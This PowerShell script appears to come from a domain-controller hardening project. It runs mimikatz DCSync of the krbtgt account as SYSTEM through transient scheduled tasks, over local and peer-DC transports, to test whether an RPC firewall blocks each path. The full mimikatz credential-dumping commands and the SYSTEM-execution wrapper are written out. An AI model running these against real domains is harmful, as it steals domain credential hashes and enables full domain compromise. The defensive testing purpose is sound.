<#
.SYNOPSIS
    Runs mimikatz DCSync twice as SYSTEM via Task Scheduler, once against
    the local DC (default RPC resolution, may pick ncalrpc) and once against
    the peer DC (forces network TCP path), so we can compare which variant
    the DRSI capture + Phase 6 firewall actually intercept.

.DESCRIPTION
    All work runs elevated as t0-admin. The mimikatz execution itself is
    launched from Scheduled Task actions with UserId=SYSTEM, so the RPC
    calls originate from an actual SYSTEM token.

    The script does NOT modify any hardening state (sentinels, allowlists,
    firewall). It only creates and deletes two transient scheduled tasks.

.PARAMETER MimikatzPath
    Full path to mimikatz.exe on this DC.

.PARAMETER LocalDcFqdn
    FQDN of the DC we're currently running on (default: this machine's FQDN).

.PARAMETER PeerDcFqdn
    FQDN of the OTHER DC. mimikatz will use /dc:<peer> to force a network
    binding for the second test.
#>

[CmdletBinding()]
param(
    [string]$MimikatzPath = 'C:\Users\t0-admin\Desktop\mimikatz.exe',
    [string]$LocalDcFqdn  = "$env:COMPUTERNAME.$((Get-CimInstance Win32_ComputerSystem).Domain)",
    [string]$PeerDcFqdn   = ''
)

$ErrorActionPreference = 'Stop'

# ---------- 0. Prerequisites -----------------------------------------------

if (-not (Test-Path $MimikatzPath)) {
    throw "mimikatz.exe not found at $MimikatzPath"
}

# Auto-detect peer DC if not passed
if (-not $PeerDcFqdn) {
    try {
        Import-Module ActiveDirectory
        $me   = ($env:COMPUTERNAME).ToLower()
        $peer = Get-ADDomainController -Filter * |
            Where-Object { $_.Name.ToLower() -ne $me } |
            Select-Object -First 1
        if ($peer) { $PeerDcFqdn = $peer.HostName }
    } catch {}
}

if (-not $PeerDcFqdn) {
    throw "Could not auto-detect a peer DC. Pass -PeerDcFqdn explicitly."
}

$captureDir = 'C:\Hardening\capture'
if (-not (Test-Path $captureDir)) { New-Item -ItemType Directory -Path $captureDir -Force | Out-Null }

Write-Host ""
Write-Host "==================================================" -ForegroundColor Cyan
Write-Host "  DCSync transport isolation test" -ForegroundColor Cyan
Write-Host "==================================================" -ForegroundColor Cyan
Write-Host "  Local DC : $LocalDcFqdn"
Write-Host "  Peer DC  : $PeerDcFqdn"
Write-Host "  Mimikatz : $MimikatzPath"
Write-Host "  Runs as  : NT AUTHORITY\SYSTEM (Task Scheduler)"
Write-Host ""

# ---------- 1. Marker into the DRSI manifest ------------------------------
$manifest = Join-Path $captureDir 'manifest.csv'
if (Test-Path $manifest) {
    Add-Content -Path $manifest -Value "# --- TRANSPORT TEST START $(Get-Date -Format o) ---"
}

# ---------- 2. Helper: run mimikatz as SYSTEM via scheduled task ----------

function Invoke-MimikatzAsSystem {
    param(
        [Parameter(Mandatory)][string]$TaskName,
        [Parameter(Mandatory)][string]$Label,
        [Parameter(Mandatory)][string[]]$MimikatzArgs,
        [string]$LogPath
    )

    Write-Host "----------------------------------------" -ForegroundColor Yellow
    Write-Host "  Test: $Label" -ForegroundColor Yellow
    Write-Host "----------------------------------------" -ForegroundColor Yellow

    if (-not $LogPath) {
        $LogPath = Join-Path $captureDir ("mimikatz-{0}-{1}.log" -f $TaskName, (Get-Date -Format 'HHmmss'))
    }
    if (Test-Path $LogPath) { Remove-Item $LogPath -Force }

    # Prepend the mimikatz "log" command so its output lands in a file
    $fullArgs = @("`"log $LogPath`"", '"privilege::debug"') + $MimikatzArgs + @('"exit"')
    $argString = $fullArgs -join ' '

    if (Test-Path $manifest) {
        Add-Content -Path $manifest -Value "# --- $Label START $(Get-Date -Format o) ---"
    }

    $action    = New-ScheduledTaskAction -Execute $MimikatzPath -Argument $argString
    $trigger   = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddSeconds(10))
    $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
    $settings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries

    Register-ScheduledTask -TaskName $TaskName `
        -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null

    Write-Host "  Task registered: $TaskName"
    Write-Host "  Waiting 40s for execution and output flush..."
    Start-Sleep -Seconds 40

    # Grab task run info
    $info = Get-ScheduledTaskInfo -TaskName $TaskName -ErrorAction SilentlyContinue
    Write-Host ""
    Write-Host "  LastRunTime    : $($info.LastRunTime)"
    Write-Host "  LastTaskResult : 0x$('{0:X8}' -f $info.LastTaskResult) ($($info.LastTaskResult))"
    Write-Host ""

    if (Test-Path $manifest) {
        Add-Content -Path $manifest -Value "# --- $Label END $(Get-Date -Format o) ---"
    }

    # Print the mimikatz output
    if (Test-Path $LogPath) {
        Write-Host "  Mimikatz output ($LogPath):" -ForegroundColor Green
        $content = Get-Content -Path $LogPath
        $content | ForEach-Object { Write-Host "    | $_" }

        # Classify
        $succeeded = ($content -match 'Hash NTLM|aes256_hmac')
        $blocked   = ($content -match 'RPC Exception|access.*denied|rpc_s_access_denied')

        Write-Host ""
        if ($succeeded)     { Write-Host "  VERDICT: DCSYNC SUCCEEDED" -ForegroundColor Red }
        elseif ($blocked)   { Write-Host "  VERDICT: DCSYNC BLOCKED"   -ForegroundColor Green }
        else                { Write-Host "  VERDICT: UNCLEAR - review output above" -ForegroundColor Magenta }
    } else {
        Write-Host "  WARNING: no log file produced at $LogPath" -ForegroundColor Magenta
    }

    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
    Write-Host ""
}

# ---------- 3. Test A: default resolution (may pick ncalrpc) --------------

Invoke-MimikatzAsSystem `
    -TaskName 'DcsyncTest_A_Default' `
    -Label   'A: default target (probable ncalrpc if same-DC)' `
    -MimikatzArgs @("`"lsadump::dcsync /domain:$($env:USERDNSDOMAIN) /user:krbtgt`"")

# ---------- 4. Test B: forced peer DC (network TCP path) ------------------

Invoke-MimikatzAsSystem `
    -TaskName 'DcsyncTest_B_ForcedPeer' `
    -Label   "B: forced /dc:$PeerDcFqdn (network ncacn_ip_tcp)" `
    -MimikatzArgs @("`"lsadump::dcsync /domain:$($env:USERDNSDOMAIN) /dc:$PeerDcFqdn /user:krbtgt`"")

# ---------- 5. End marker + interpretation --------------------------------

if (Test-Path $manifest) {
    Add-Content -Path $manifest -Value "# --- TRANSPORT TEST END $(Get-Date -Format o) ---"
}

Write-Host "==================================================" -ForegroundColor Cyan
Write-Host "  Interpretation" -ForegroundColor Cyan
Write-Host "==================================================" -ForegroundColor Cyan
Write-Host ""
Write-Host " If A SUCCEEDED and B BLOCKED :" -ForegroundColor Yellow
Write-Host "   The ncalrpc bypass theory is CONFIRMED. The local DRSUAPI"
Write-Host "   ncalrpc endpoint is a gap. Next step: block ncalrpc for the"
Write-Host "   DRSUAPI UUID via netsh rpc filter (test for tool breakage first)."
Write-Host ""
Write-Host " If A SUCCEEDED and B SUCCEEDED :" -ForegroundColor Yellow
Write-Host "   SYSTEM authenticates cross-DC as the machine account, making"
Write-Host "   the network path indistinguishable from legit KCC replication."
Write-Host "   The wire-level ceiling described in memory 6 stands."
Write-Host "   WDAC becomes the only path forward for this attack shape."
Write-Host ""
Write-Host " If A BLOCKED and B BLOCKED :" -ForegroundColor Yellow
Write-Host "   Something else changed between runs. Re-run and inspect"
Write-Host "   Phase 6 (rpcFirewall) event log for the blocked opnum 3 events."
Write-Host ""
Write-Host " If A BLOCKED and B SUCCEEDED :" -ForegroundColor Yellow
Write-Host "   Unexpected - would indicate ncalrpc is enforcing and TCP is"
Write-Host "   the gap. Very unlikely in this build."
Write-Host ""
Write-Host " Check the manifest for corresponding opnum=0 and opnum=3 rows"
Write-Host " between the START/END markers of each test:"
Write-Host ""
Write-Host "   Import-Csv -Path C:\Hardening\capture\manifest.csv \``"
Write-Host "     -Header timestamp_utc,source_ip,caller_sid,opnum,byte_len,filename,label |``"
Write-Host "     Where-Object timestamp_utc -like '<test-window>*'"
Write-Host ""
Write-Host "==================================================" -ForegroundColor Cyan
